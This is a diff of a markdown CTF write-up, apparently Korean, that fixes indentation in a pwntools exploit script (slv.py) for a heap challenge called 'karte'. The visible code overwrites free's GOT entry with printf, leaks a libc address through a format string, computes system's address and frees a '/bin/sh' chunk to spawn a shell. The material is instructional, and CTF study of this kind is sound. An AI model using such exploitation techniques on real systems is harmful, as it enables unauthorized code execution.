@@ -290,6 +290,7 @@ tcache가 있어서 3번 modify기능을 이용해서 fd를 조작 후 바로 �
 ## slv.py
 
 ```python
+
 from pwn import *
 
 p = process("./karte")
@@ -394,7 +395,6 @@ def main():
     
     delete(id2)
     
-    
     payload = ''
     payload += 'a'*0xb # padding
     payload += p64(0x0000deadc0bebeef) # allocate at lock
@@ -415,7 +415,7 @@ def main():
     modify(id3 & 0xff, payload) # overwrite free_got to printf_plt
     
     
-	delete(id1) # call printf("%13$p")
+    delete(id1) # call printf("%13$p")
     
 	
     libc_base = int(p.recvuntil('Deleted').split('0x')[1][:12], 16) - 0x21b97
@@ -423,16 +423,16 @@ def main():
     system_addr = libc_base + system_offset
     
     
-	payload = ''
+    payload = ''
     payload += p32(0x400706)[:-1]
     
     modify(id3 & 0xff, payload)
     
     
-	id1 = add(0x20, '/bin/sh\x00')
+    id1 = add(0x20, '/bin/sh\x00')
     
     
-	delete(id1)
+    delete(id1)
     
 	
     payload = ''
